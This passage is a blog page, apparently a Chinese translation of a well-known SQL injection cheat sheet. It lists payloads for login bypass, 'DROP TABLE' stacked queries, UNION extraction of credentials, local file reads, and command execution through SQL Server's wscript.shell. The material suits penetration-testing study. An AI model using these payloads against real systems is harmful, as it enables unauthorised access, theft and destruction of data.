@@ -1,0 +1,696 @@
+<!DOCTYPE html>
+<!--[if lte IE 8 ]>
+<html class="ie" xmlns="http://www.w3.org/1999/xhtml" xml:lang="en-US" lang="en-US">
+<![endif]-->
+<!--[if (gte IE 9)|!(IE)]><!-->
+<!--
+***************  *      *     *
+      8          *    *       *
+      8          *  *         *
+      8          **           *
+      8          *  *         *
+      8          *    *       *
+      8          *      *     *
+      8          *        *   ***********    -----Theme By Kieran(http://go.kieran.top)
+-->
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="zh-CN" lang="zh-CN">
+<!--<![endif]-->
+
+<head>
+  <title>SQL注入速查表（上） | 这是一片正在生长的麦田|乂小七</title>
+  <!-- Meta data -->
+    <meta http-equiv="Content-Type" content="text/html" charset="UTF-8" >
+    <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <meta name="generator" content="这是一片正在生长的麦田|乂小七">
+    <meta name="author" content="John Doe">
+    <meta name="description" content="这是一片麦田" />
+    <meta name="keywords" content="乂小七, 这是一片麦田 , PHP,Python" />
+
+    <!-- Favicon, (keep icon in root folder) -->
+    <link rel="Shortcut Icon" href="/img/favicon.ico" type="image/ico">
+
+    <link rel="alternate" href="/atom.xml" title="这是一片正在生长的麦田|乂小七" type="application/atom+xml">
+    <link rel="stylesheet" href="/css/all.css" media="screen" type="text/css">
+    
+    <link rel="stylesheet" href="/highlightjs/vs.css" type="text/css">
+    
+
+    <!--[if IE 8]>
+    <link rel="stylesheet" type="text/css" href="/css/ie8.css" />
+    <![endif]-->
+
+    <!-- jQuery | Load our jQuery, with an alternative source fallback to a local version if request is unavailable -->
+    <script src="/js/jquery-1.11.1.min.js"></script>
+    <script>window.jQuery || document.write('<script src="js/jquery-1.11.1.min.js"><\/script>')</script>
+
+    <!-- Load these in the <head> for quicker IE8+ load times -->
+    <!-- HTML5 shim and Respond.js IE8 support of HTML5 elements and media queries -->
+    <!--[if lt IE 9]>
+    <script src="/js/html5shiv.min.js"></script>
+    <script src="/js/respond.min.js"></script>
+    <![endif]-->
+
+  
+  
+  
+
+  <style>.col-md-8.col-md-offset-2.opening-statement img{display:none;}</style>
+</head>
+
+<!--
+<body class="post-template">
+-->
+<body id="index" class="lightnav animsition">
+
+      <!-- ============================ Off-canvas navigation =========================== -->
+
+    <div class="sb-slidebar sb-right sb-style-overlay sb-momentum-scrolling">
+        <div class="sb-close" aria-label="Close Menu" aria-hidden="true">
+            <img src="/img/close.png" alt="Close">
+        </div>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu">
+            <li><a href="/" class="animsition-link" title="Home">Home</a></li>
+            <li><a href="/archives" class="animsition-link" title="archive">archives</a></li>
+            <!-- Dropdown Menu -->
+			 
+            <li>
+                <a class="sb-toggle-submenu">Works<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                        <li><a href="/" target="_BLANK" class="animsition-link">AAA</a></li>
+                    
+                        <li><a href="/atom.xml" target="_BLANK" class="animsition-link">BBB</a></li>
+                    
+                </ul>
+            </li>
+            
+            
+        	<li>
+        		<a class="sb-toggle-submenu">Categories<span class="sb-caret"></span></a>
+            	<ul class="sb-submenu">
+				  	
+				    <li><a href="/categories/Linux/" class="animsition-link">Linux<small>(30)</small></a></li>
+				    
+				    <li><a href="/categories/Linux/MYSQL/" class="animsition-link">MYSQL<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/MYSQL/" class="animsition-link">MYSQL<small>(7)</small></a></li>
+				    
+				    <li><a href="/categories/Linux/MongoDB/" class="animsition-link">MongoDB<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/jquery-amp-htm-amp-js/" class="animsition-link">jquery&amp;amp;htm&amp;amp;js<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/php/" class="animsition-link">php<small>(14)</small></a></li>
+				    
+				    <li><a href="/categories/Linux/MYSQL/php/" class="animsition-link">php<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/Linux/php/" class="animsition-link">php<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/佛学/" class="animsition-link">佛学<small>(3)</small></a></li>
+				    
+				    <li><a href="/categories/哲学/" class="animsition-link">哲学<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/学习方法/" class="animsition-link">学习方法<small>(7)</small></a></li>
+				    
+				    <li><a href="/categories/摄影笔记/" class="animsition-link">摄影笔记<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/文学/" class="animsition-link">文学<small>(3)</small></a></li>
+				    
+				    <li><a href="/categories/时间管理/" class="animsition-link">时间管理<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/未分类/" class="animsition-link">未分类<small>(5)</small></a></li>
+				    
+				    <li><a href="/categories/来自电影/" class="animsition-link">来自电影<small>(3)</small></a></li>
+				    
+				    <li><a href="/categories/算法/" class="animsition-link">算法<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/php/算法/" class="animsition-link">算法<small>(2)</small></a></li>
+				    
+				    <li><a href="/categories/随笔/" class="animsition-link">随笔<small>(3)</small></a></li>
+				    
+				    <li><a href="/categories/黑客-amp-骇客/" class="animsition-link">黑客&amp;amp;骇客<small>(4)</small></a></li>
+				    
+				    <li><a href="/categories/MYSQL/黑客-amp-骇客/" class="animsition-link">黑客&amp;amp;骇客<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/Linux/MYSQL/黑客-amp-骇客/" class="animsition-link">黑客&amp;amp;骇客<small>(1)</small></a></li>
+				    
+				    <li><a href="/categories/Linux/MYSQL/php/黑客-amp-骇客/" class="animsition-link">黑客&amp;amp;骇客<small>(1)</small></a></li>
+				    
+				</ul>
+        	</li>
+			
+            
+            <li>
+                <a class="sb-toggle-submenu">Links<span class="sb-caret"></span></a>
+                <ul class="sb-submenu">
+                    
+                    <li><a href="http://go.kieran.top/" class="animsition-link">Kieran</a></li>
+                    
+                    <li><a href="http://domain.com/" class="animsition-link">Name</a></li>
+                    
+                </ul>
+            </li>
+            
+        </ul>
+        <!-- Lists in Slidebars -->
+        <ul class="sb-menu secondary">
+            
+            <li><a href="/about.html" class="animsition-link" title="about">About</a></li>
+            <li><a href="/atom.xml" class="animsition-link" title="rss">RSS</a></li>
+        </ul>
+    </div>
+    
+    <!-- ============================ END Off-canvas navigation =========================== -->
+
+    <!-- ============================ #sb-site Main Page Wrapper =========================== -->
+
+    <div id="sb-site">
+        <!-- #sb-site - All page content should be contained within this id, except the off-canvas navigation itself -->
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+        <div id="navigation" class="navbar navbar-fixed-top">
+            <div class="navbar-inner">
+                <div class="container">
+                    <!-- Nav logo -->
+                    <div class="logo">
+                        <a href="/" title="Logo" class="animsition-link">
+                         <img src="/img/logo.png" alt="Logo" width="35px;"> 
+                        </a>
+                    </div>
+                    <!-- // Nav logo -->
+                    <!-- Info-bar -->
+                    <nav>
+                        <ul class="nav">
+                            <li><a href="/" class="animsition-link">这是一片正在生长的麦田|乂小七</a></li>
+                            <li class="nolink"><span>Always </span>Creative.</li>
+                            
+                            <li><a href="https://github.com/" title="Github" target="_blank"><i class="icon-github"></i></a></li>
+                            
+                            
+                            <li><a href="https://twitter.com/" title="Twitter" target="_blank"><i class="icon-twitter"></i></a></li>
+                            
+                            
+                            <li><a href="https://www.facebook.com/" title="Facebook" target="_blank"><i class="icon-facebook"></i></a></li>
+                            
+                            
+                            <li><a href="https://google.com/" title="Google-Plus" target="_blank"><i class="icon-google-plus"></i></a></li>
+                            
+                            
+                            <li><a href="http://weibo.com/" title="Sina-Weibo" target="_blank"><i class="icon-sina-weibo"></i></a></li>
+                            
+                            <li class="nolink"><span>Welcome!</span></li>
+                        </ul>
+                    </nav>
+                    <!--// Info-bar -->
+                </div>
+                <!-- // .container -->
+                <div class="learnmore sb-toggle-right">More</div>
+                <button type="button" class="navbar-toggle menu-icon sb-toggle-right" title="More">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar before"></span>
+                <span class="icon-bar main"></span>
+                <span class="icon-bar after"></span>
+                </button>
+            </div>
+            <!-- // .navbar-inner -->
+        </div>
+
+        <!-- ============================ Header & Logo bar =========================== -->
+
+</div>
+      
+<section id="intro">
+    <div class="container">
+        <div class="row col-md-offset-2">
+            <div class="col-md-8">
+    			<span class="post-meta">
+      <time datetime="2015-11-03T08:54:36.000Z" itemprop="datePublished">
+          2015-11-03
+      </time>
+    
+    
+    | 
+    <a href="/tags/sql注入/">sql注入</a>
+    
+    
+</span>
+                <h1>SQL注入速查表（上）</h1>
+            </div>
+        </div>
+        <div class="col-md-8 col-md-offset-2">
+      		<p><em>本文由Yinzo翻译，转载请保留署名。原文地址：<a href="http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell" target="_blank" rel="noopener">http://ferruh.mavituna.com/sql-injection-cheatsheet-oku/#Enablecmdshell</a>__文档版本：1.4</em></p>
+<h1 id="0x00-关于SQL注入速查表"><a href="#0x00-关于SQL注入速查表" class="headerlink" title="0x00 关于SQL注入速查表"></a>0x00 关于SQL注入速查表</h1><hr>
+<p>现在仅支持MySQL、Microsoft SQL Server，以及一部分ORACLE和PostgreSQL。大部分样例都不能保证每一个场景都适用。现实场景由于各种插入语、不同的代码环境以及各种不常见甚至奇特的SQL语句，而经常发生变化。 样例仅用于读者理解对于“可能出现的攻击(a potential attack)”的基础概念，并且几乎每一个部分都有一段简洁的概要</p>
+<ul>
+<li>M: MySQL</li>
+<li>S: SQL Server</li>
+<li>P: PostgreSQL</li>
+<li>O: Oracle</li>
+<li>+: (大概)其他所有数据库</li>
+</ul>
+<p>_例子_：</p>
+<ul>
+<li>(MS) 代表 : MySQL 和 SQL Server 等</li>
+<li>(M*S) 代表 : 仅对某些版本或者某些附在后文中的特殊情况的 MySQL，以及SQL Server</li>
+</ul>
+<h1 id="0x01-目录"><a href="#0x01-目录" class="headerlink" title="0x01 目录"></a>0x01 目录</h1><hr>
+<ol>
+<li>关于SQL注入速查表</li>
+<li>语法参考，攻击样例以及注入小技巧<ol>
+<li>行间注释<ol>
+<li>使用了行间注释的SQL注入攻击样例</li>
+</ol>
+</li>
+<li>行内注释<ol>
+<li>使用了行内注释的注入攻击样例</li>
+<li>MySQL版本探测攻击样例</li>
+</ol>
+</li>
+<li>堆叠查询(Stacking Queries)<ol>
+<li>支持堆叠查询的语言/数据库</li>
+<li>关于MySQL和PHP</li>
+<li>堆叠注入攻击样例</li>
+</ol>
+</li>
+<li>If语句<ol>
+<li>MySQL的If语句</li>
+<li>SQL Server的If语句</li>
+<li>使用了If语句的注入攻击样例</li>
+</ol>
+</li>
+<li>整数(Integers)的使用</li>
+<li>字符串操作<ol>
+<li>字符串的串联</li>
+</ol>
+</li>
+<li>没有引号的字符串<ol>
+<li>使用了16进制的注入攻击样例</li>
+</ol>
+</li>
+<li>字符串异化(Modification)与联系</li>
+<li>Union注入<ol>
+<li>UNION-语言问题处理</li>
+</ol>
+</li>
+<li>绕过登陆界面(SMO+)</li>
+<li>绕过检查MD5哈希的登陆界面<ol>
+<li>绕过MD5哈希检查的例子(MSP)</li>
+</ol>
+</li>
+<li>基于错误(Error Based)-探测字段名<ol>
+<li>使用HAVING来探测字段名(S)</li>
+<li>在SELECT查询中使用ORDER BY探测字段数(MSO+)</li>
+</ol>
+</li>
+<li>数据类型、UNION、之类的<ol>
+<li>获取字段类型</li>
+</ol>
+</li>
+<li>简单的注入(MSO+)</li>
+<li>有用的函数、信息收集、内置程序、大量注入笔记<ol>
+<li>@@version(MS)</li>
+<li>文件插入(Bulk Insert)(S)</li>
+<li>BCP(S)</li>
+<li>SQL Server的VBS/WSH(S)</li>
+<li>执行系统命令，xp_cmdshell(S)</li>
+<li>SQL Server中的一些特殊的表(S)</li>
+<li>SQL Server的其它内置程序(S)</li>
+<li>大量MSSQL笔记</li>
+<li>使用LIMIT(M)或ORDER(MSO)的注入</li>
+<li>关掉SQL Server(S)</li>
+</ol>
+</li>
+<li>在SQL Server 2005中启用xp_cmdshell</li>
+<li>探测SQL Server数据库的结构(S)<ol>
+<li>获取用户定义表</li>
+<li>获取字段名</li>
+</ol>
+</li>
+<li>移动记录(Moving records)(S)</li>
+<li>快速的脱掉基于错误(Error Based)的SQL Server注入(S)</li>
+</ol>
+</li>
+</ol>
+<h1 id="0x02-语法参考，攻击样例以及注入小技巧"><a href="#0x02-语法参考，攻击样例以及注入小技巧" class="headerlink" title="0x02 语法参考，攻击样例以及注入小技巧"></a>0x02 语法参考，攻击样例以及注入小技巧</h1><hr>
+<h3 id="行间注释"><a href="#行间注释" class="headerlink" title="行间注释"></a>行间注释</h3><p><strong>注释掉查询语句的其余部分</strong> 行间注释通常用于注释掉查询语句的其余部分，这样你就不需要去修复整句语法了。</p>
+<ul>
+<li>–(SM)DROP sampletable;–</li>
+<li>#(M)DROP sampletable;#</li>
+</ul>
+<h4 id="使用了行间注释的SQL注入攻击样例"><a href="#使用了行间注释的SQL注入攻击样例" class="headerlink" title="使用了行间注释的SQL注入攻击样例"></a>使用了行间注释的SQL注入攻击样例</h4><blockquote>
+<p>用户名:admin’–</p>
+</blockquote>
+<ul>
+<li>构成语句:SELECT * FROM members WHERE username = ‘admin’–’ AND password = ‘password’这会使你以admin身份登陆，因为其余部分的SQL语句被注释掉了。</li>
+</ul>
+<h3 id="行内注释"><a href="#行内注释" class="headerlink" title="行内注释"></a>行内注释</h3><p><strong>通过不关闭注释注释掉查询语句的其余部分</strong>，或者用于<strong>绕过过滤</strong>，移除空格，混淆，或探测数据库版本。</p>
+<ul>
+<li>/<em>注释内容</em>/(SM)<ul>
+<li>DROP/*comment*/sampletable</li>
+<li>DR/*<em>/OP/</em>绕过过滤*/sampletable</li>
+<li>SELECT/<em>替换空格</em>/password/<strong>/FROM/</strong>/Members</li>
+</ul>
+</li>
+<li>/<em>! MYSQL专属 </em>/(M) 这是个MySQL专属语法。非常适合用于探测MySQL版本。如果你在注释中写入代码，只有MySQL才会执行。同样的你也可以用这招，使得只有高于某版本的服务器才执行某些代码。SELECT /<em>!32302 1/0, </em>/ 1 FROM tablename</li>
+</ul>
+<h4 id="使用了行内注释的注入攻击样例"><a href="#使用了行内注释的注入攻击样例" class="headerlink" title="使用了行内注释的注入攻击样例"></a>使用了行内注释的注入攻击样例</h4><blockquote>
+<p>ID:10; DROP TABLE members /*</p>
+</blockquote>
+<p>简单地摆脱了处理后续语句的麻烦，同样你可以使用10; DROP TABLE members –</p>
+<h4 id="MySQL版本探测攻击样例"><a href="#MySQL版本探测攻击样例" class="headerlink" title="MySQL版本探测攻击样例"></a>MySQL版本探测攻击样例</h4><blockquote>
+<p>SELECT /<em>!32302 1/0, </em>/ 1 FROM tablename</p>
+</blockquote>
+<p>如果MySQL的版本高于<strong>3.23.02</strong>，会抛出一个division by 0 error</p>
+<blockquote>
+<p>ID:/<em>!32302 10</em>/ID:10</p>
+</blockquote>
+<p>如果MySQL版本高于3.23.02，以上两次查询你将得到相同的结果</p>
+<h3 id="堆叠查询-Stacking-Queries"><a href="#堆叠查询-Stacking-Queries" class="headerlink" title="堆叠查询(Stacking Queries)"></a>堆叠查询(Stacking Queries)</h3><p><strong>一句代码之中执行多个查询语句</strong>，这在每一个注入点都非常有用，尤其是使用SQL Server后端的应用</p>
+<ul>
+<li>;(S)SELECT * FROM members; DROP members–结束一个查询并开始一个新的查询</li>
+</ul>
+<h4 id="支持堆叠查询的语言-数据库"><a href="#支持堆叠查询的语言-数据库" class="headerlink" title="支持堆叠查询的语言/数据库"></a>支持堆叠查询的语言/数据库</h4><p><strong>绿色：</strong>支持，<strong>暗灰色：</strong>不支持，<strong>浅灰色：</strong>未知 <img src="http://static.wooyun.org/drops/20150819/2015081902360042624.jpg" alt="enter image description here"></p>
+<h4 id="关于MySQL和PHP"><a href="#关于MySQL和PHP" class="headerlink" title="关于MySQL和PHP"></a>关于MySQL和PHP</h4><p>阐明一些问题。 <strong>PHP-MySQL不支持堆叠查询</strong>，Java不支持堆叠查询（ORACLE的我很清楚，其他的就不确定了）。一般来说MySQL支持堆叠查询，但由于大多数PHP-Mysql应用框架的数据库层都不能执行第二条查询，或许MySQL的客户端支持这个，我不确定，有人能确认一下吗？ <em>（译者注：MySQL 5.6.20版本下客户端支持堆叠查询）</em></p>
+<h4 id="堆叠注入攻击样例"><a href="#堆叠注入攻击样例" class="headerlink" title="堆叠注入攻击样例"></a>堆叠注入攻击样例</h4><blockquote>
+<p>ID:10;DROP members –</p>
+</blockquote>
+<p>构成语句：SELECT * FROM products WHERE id = 10; DROP members–这在执行完正常查询之后将会执行DROP查询。</p>
+<h3 id="If语句"><a href="#If语句" class="headerlink" title="If语句"></a>If语句</h3><p>根据If语句得到响应。这是<strong>盲注(Blind SQL Injection)的关键之一</strong>，同样也能简单而<strong>准确地</strong>进行一些测试。</p>
+<h4 id="MySQL的If语句"><a href="#MySQL的If语句" class="headerlink" title="MySQL的If语句"></a>MySQL的If语句</h4><ul>
+<li><p>IF(condition,true-part,false-part)(M)</p>
+<blockquote>
+<p>SELECT IF (1=1,’true’,’false’)</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="SQL-Server的If语句"><a href="#SQL-Server的If语句" class="headerlink" title="SQL Server的If语句"></a>SQL Server的If语句</h4><ul>
+<li><p>IF condition true-part ELSE false-part(S)</p>
+<blockquote>
+<p>IF (1=1) SELECT ‘true’ ELSE SELECT ‘false’</p>
+</blockquote>
+</li>
+</ul>
+<h4 id="使用了If语句的注入攻击样例"><a href="#使用了If语句的注入攻击样例" class="headerlink" title="使用了If语句的注入攻击样例"></a>使用了If语句的注入攻击样例</h4><blockquote>
+<p>if ((select user) = ‘sa’ OR (select user) = ‘dbo’) select 1 else select 1/0(S)</p>
+</blockquote>
+<p>如果当前用户不是<strong>“sa”或者”dbo”</strong>,就会抛出一个<strong>divide by zero error</strong>。</p>
+<h3 id="整数-Integers-的使用"><a href="#整数-Integers-的使用" class="headerlink" title="整数(Integers)的使用"></a>整数(Integers)的使用</h3><p>对于绕过十分有用，比如<strong>magic_quotes() 和其他类似过滤器</strong>，甚至是各种WAF。</p>
+<ul>
+<li>0xHEXNUMBER(SM) (HEXNUMBER:16进制数） 你能这样使用16进制数：<ul>
+<li>SELECT CHAR(0x66)(S)</li>
+<li>SELECT 0x5045(M) (这不是一个整数，而会是一个16进制字符串）</li>
+<li>SELECT 0x50 + 0x45(M) (现在这是整数了)</li>
+</ul>
+</li>
+</ul>
+<h3 id="字符串操作"><a href="#字符串操作" class="headerlink" title="字符串操作"></a>字符串操作</h3><p>与字符串相关的操作。这对于构造一个不含有引号，用于绕过或探测数据库都非常的有用。</p>
+<h4 id="字符串的串联"><a href="#字符串的串联" class="headerlink" title="字符串的串联"></a>字符串的串联</h4><ul>
+<li>+(S)SELECT login + ‘-‘ + password FROM members</li>
+<li>||(*MO)SELECT login || ‘-‘ || password FROM members</li>
+</ul>
+<p><strong>*关于MySQL的”||”</strong> 这个仅在ANSI模式下的MySQL执行，其他情况下都会当成’逻辑操作符’并返回一个0。更好的做法是使用CONCAT()函数。</p>
+<ul>
+<li>CONCAT(str1, str2, str3, …)(M) 连接参数里的所有字符串 例：SELECT CONCAT(login, password) FROM members</li>
+</ul>
+<h3 id="没有引号的字符串"><a href="#没有引号的字符串" class="headerlink" title="没有引号的字符串"></a>没有引号的字符串</h3><p>有很多使用字符串的方法，但是这几个方法是一直可用的。使用CHAR()(MS)和CONCAT()(M)来生成没有引号的字符串</p>
+<ul>
+<li>0x457578(M) - 16进制编码的字符串SELECT 0x457578这在MySQL中会被当做字符串处理</li>
+<li>在MySQL中使用16进制字符串的一个简单方式：SELECT CONCAT(‘0x’,HEX(‘c:\\boot.ini’))</li>
+<li>在MySQL中使用CONCAT()函数：SELECT CONCAT(CHAR(75),CHAR(76),CHAR(77))(M) 这会返回’KLM’</li>
+<li>SELECT CHAR(75)+CHAR(76)+CHAR(77)(S) 这会返回’KLM’</li>
+</ul>
+<h4 id="使用了16进制的注入攻击样例"><a href="#使用了16进制的注入攻击样例" class="headerlink" title="使用了16进制的注入攻击样例"></a>使用了16进制的注入攻击样例</h4><ul>
+<li>SELECT LOAD_FILE(0x633A5C626F6F742E696E69)(M) 这会显示<strong>c:\boot.ini</strong>的内容</li>
+</ul>
+<h3 id="字符串异化-Modification-与联系"><a href="#字符串异化-Modification-与联系" class="headerlink" title="字符串异化(Modification)与联系"></a>字符串异化(Modification)与联系</h3><ul>
+<li>ASCII()(SMP) 返回最左边字符的ASCII码的值。这是一个用于盲注的重要函数。 例：SELECT ASCII(‘a’)</li>
+<li>CHAR()(SM) 把整数转换为对应ASCII码的字符 例：SELECT CHAR(64)</li>
+</ul>
+<h3 id="Union注入"><a href="#Union注入" class="headerlink" title="Union注入"></a>Union注入</h3><p>通过union你能跨表执行查询。最简单的，你能注入一个查询使得它返回另一个表的内容。SELECT header, txt FROM news UNION ALL SELECT name, pass FROM members这会把news表和members表的内容合并返回。 另一个例子：’ UNION SELECT 1, ‘anotheruser’, ‘doesnt matter’, 1–</p>
+<h4 id="UNION-语言问题处理"><a href="#UNION-语言问题处理" class="headerlink" title="UNION-语言问题处理"></a>UNION-语言问题处理</h4><p>当你使用Union来注入的时候，经常会遇到一些错误，这是由于不同的语言的设置（表的设置、字段设置、表或数据库的设置等等）。这些办法对于解决那些问题都挺有用的，尤其是当你处理日文，俄文，土耳其文的时候你会就会见到他们的。</p>
+<ul>
+<li>使用COLLATE SQL_Latin1_General_Cp1254_CS_AS(S) 或者其它的什么语句，具体的自己去查SQL Server的文档。 例：SELECT header FROM news UNION ALL SELECT name COLLATE SQL_Latin1_General_Cp1254_CS_AS FROM members</li>
+<li>Hex()(M) 百试百灵~</li>
+</ul>
+<h3 id="绕过登陆界面-SMO"><a href="#绕过登陆界面-SMO" class="headerlink" title="绕过登陆界面(SMO+)"></a>绕过登陆界面(SMO+)</h3><p><em>SQL注入101式</em>(大概是原文名字吧？),登陆小技巧</p>
+<ul>
+<li>admin’ –</li>
+<li>admin’ #</li>
+<li>admin’/*</li>
+<li>‘ or 1=1–</li>
+<li>‘ or 1=1#</li>
+<li>‘ or 1=1/*</li>
+<li>‘) or ‘1’=’1–</li>
+<li>‘) or (‘1’=’1–</li>
+<li>….</li>
+<li>以不同的用户登陆 (SM*)’ UNION SELECT 1, ‘anotheruser’, ‘doesnt matter’, 1–</li>
+</ul>
+<p>*<em>旧版本的MySQL不支持union</em></p>
+<h3 id="绕过检查MD5哈希的登陆界面"><a href="#绕过检查MD5哈希的登陆界面" class="headerlink" title="绕过检查MD5哈希的登陆界面"></a>绕过检查MD5哈希的登陆界面</h3><p>如果应用是先通过用户名，读取密码的MD5，然后和你提供的密码的MD5进行比较，那么你就需要一些额外的技巧才能绕过验证。你可以把一个已知明文的MD5哈希和它的明文一起提交，使得程序不使用从数据库中读取的哈希，而使用你提供的哈希进行比较。</p>
+<h4 id="绕过MD5哈希检查的例子-MSP"><a href="#绕过MD5哈希检查的例子-MSP" class="headerlink" title="绕过MD5哈希检查的例子(MSP)"></a>绕过MD5哈希检查的例子(MSP)</h4><blockquote>
+<p>用户名：admin密码：1234 ‘ AND 1=0 UNION ALL SELECT ‘admin’,’81dc9bdb52d04dc20036dbd8313ed055</p>
+</blockquote>
+<p>其中81dc9bdb52d04dc20036dbd8313ed055 = MD5(1234)</p>
+<h3 id="基于错误-Error-Based-探测字段名"><a href="#基于错误-Error-Based-探测字段名" class="headerlink" title="基于错误(Error Based)-探测字段名"></a>基于错误(Error Based)-探测字段名</h3><h4 id="使用HAVING来探测字段名-S"><a href="#使用HAVING来探测字段名-S" class="headerlink" title="使用HAVING来探测字段名(S)"></a>使用HAVING来探测字段名(S)</h4><ul>
+<li>‘ HAVING 1=1 –</li>
+<li>‘ GROUP BY table.columnfromerror1 HAVING 1=1 –</li>
+<li>‘ GROUP BY table.columnfromerror1, columnfromerror2 HAVING 1=1 –</li>
+<li>……</li>
+<li>‘ GROUP BY table.columnfromerror1, columnfromerror2,columnfromerror(n) HAVING 1=1 –</li>
+<li>直到它不再报错，就算搞定了</li>
+</ul>
+<h4 id="在SELECT查询中使用ORDER-BY探测字段数-MSO"><a href="#在SELECT查询中使用ORDER-BY探测字段数-MSO" class="headerlink" title="在SELECT查询中使用ORDER BY探测字段数(MSO+)"></a>在SELECT查询中使用ORDER BY探测字段数(MSO+)</h4><p>通过ORDER BY来探测字段数能够加快union注入的速度。</p>
+<ul>
+<li>ORDER BY 1–</li>
+<li>ORDER BY 2–</li>
+<li>……</li>
+<li>ORDER BY N–</li>
+<li>一直到它报错为止，最后一个成功的数字就是字段数。</li>
+</ul>
+<h3 id="数据类型、UNION、之类的"><a href="#数据类型、UNION、之类的" class="headerlink" title="数据类型、UNION、之类的"></a>数据类型、UNION、之类的</h3><p><strong>提示：</strong></p>
+<ul>
+<li>经常给<strong>UNION</strong>配上<strong>ALL</strong>使用，因为经常会有相同数值的字段，而缺省情况下UNION都会尝试返回唯一值(records with distinct)</li>
+<li>如果你每次查询只能有一条记录，而你不想让原本正常查询的记录占用这宝贵的记录位，你可以使用-1或者根本不存在的值来搞定原查询（前提是注入点在WHERE里）。</li>
+<li>在UNION中使用NULL，对于大部分数据类型来说这样都比瞎猜字符串、日期、数字之类的来得强<ul>
+<li>盲注的时候要小心判断错误是来自应用的还是来自数据库的。因为像ASP.NET就经常会在你使用NULL的时候抛出错误（因为开发者们一般都没想到用户名的框中会出现NULL）</li>
+</ul>
+</li>
+</ul>
+<h4 id="获取字段类型"><a href="#获取字段类型" class="headerlink" title="获取字段类型"></a>获取字段类型</h4><ul>
+<li>‘ union select sum(columntofind) from users–(S)Microsoft OLE DB Provider for ODBC Drivers error ‘80040e07’ [Microsoft][ODBC SQL Server Driver][SQL Server]The sum or average aggregate operation cannot take a **varchar** data type as an argument.如果没有返回错误说明字段是<strong>数字类型</strong></li>
+<li>同样的，你可以使用CAST()和CONVERT()<ul>
+<li>SELECT * FROM Table1 WHERE id = -1 UNION ALL SELECT null, null, NULL, NULL, convert(image,1), null, null,NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULl, NULL–</li>
+</ul>
+</li>
+<li>11223344) UNION SELECT NULL,NULL,NULL,NULL WHERE 1=2 –-没报错 - 语法是正确的。 这是MS SQL Server的语法。 继续。</li>
+<li>11223344) UNION SELECT 1,NULL,NULL,NULL WHERE 1=2 –-没报错 – 第一个字段是integer类型。</li>
+<li>11223344) UNION SELECT 1,2,NULL,NULL WHERE 1=2 –报错 – 第二个字段不是integer类型</li>
+<li>11223344) UNION SELECT 1,’2’,NULL,NULL WHERE 1=2 –-没报错 – 第二个字段是string类型。</li>
+<li>11223344) UNION SELECT 1,’2’,3,NULL WHERE 1=2 –-报错 – 第三个字段不是integer</li>
+<li>……Microsoft OLE DB Provider for SQL Server error ‘80040e07’ Explicit conversion from data type int to image is not allowed.</li>
+</ul>
+<p><strong>你在遇到union错误之前会先遇到convert()错误</strong>，所以先使用convert()再用union</p>
+<h3 id="简单的注入-MSO"><a href="#简单的注入-MSO" class="headerlink" title="简单的注入(MSO+)"></a>简单的注入(MSO+)</h3><p>‘; insert into users values( 1, ‘hax0r’, ‘coolpass’, 9 )/*</p>
+<h3 id="有用的函数、信息收集、内置程序、大量注入笔记"><a href="#有用的函数、信息收集、内置程序、大量注入笔记" class="headerlink" title="有用的函数、信息收集、内置程序、大量注入笔记"></a>有用的函数、信息收集、内置程序、大量注入笔记</h3><h4 id="version-MS"><a href="#version-MS" class="headerlink" title="@@version(MS)"></a>@@version(MS)</h4><p>数据库的版本。这是个常量，你能把它当做字段来SELECT，而且不需要提供表名。同样的你也可以用在INSERT/UPDATE语句里面，甚至是函数里面。INSERT INTO members(id, user, pass) VALUES(1, ‘’+SUBSTRING(@@version,1,10) ,10)</p>
+<h4 id="文件插入-Bulk-Insert-S"><a href="#文件插入-Bulk-Insert-S" class="headerlink" title="文件插入(Bulk Insert)(S)"></a>文件插入(Bulk Insert)(S)</h4><p>把文件内容插入到表中。如果你不知道应用目录你可以去<strong>读取IIS metabase file</strong>(<em>仅IIS 6</em>)(<em>%systemroot%\system32\inetsrv\MetaBase.xml</em>)然后在里面找到应用目录。</p>
+<ol>
+<li>新建一个表foo(line varchar(8000))</li>
+<li>BULK INSERT foo FROM ‘c:\inetpub\wwwroot\login.asp’</li>
+<li>DROP了临时表，重复另一个文件</li>
+</ol>
+<h4 id="BCP-S"><a href="#BCP-S" class="headerlink" title="BCP(S)"></a>BCP(S)</h4><p>写入文件。这个功能需要登录bcp “SELECT * FROM test..foo” queryout c:\inetpub\wwwroot\runcommand.asp -c -Slocalhost -Usa -Pfoobar</p>
+<h4 id="SQL-Server的VBS-WSH-S"><a href="#SQL-Server的VBS-WSH-S" class="headerlink" title="SQL Server的VBS/WSH(S)"></a>SQL Server的VBS/WSH(S)</h4><p>由于ActiveX的支持，你能在SQL Server中使用VBS/WSHdeclare @o int exec sp_oacreate ‘wscript.shell’, @o out exec sp_oamethod @o, ‘run’, NULL, ‘notepad.exe’</p>
+<blockquote>
+<p>Username:’; declare @o int exec sp_oacreate ‘wscript.shell’, @o out exec sp_oamethod @o, ‘run’, NULL, ‘notepad.exe’ –</p>
+</blockquote>
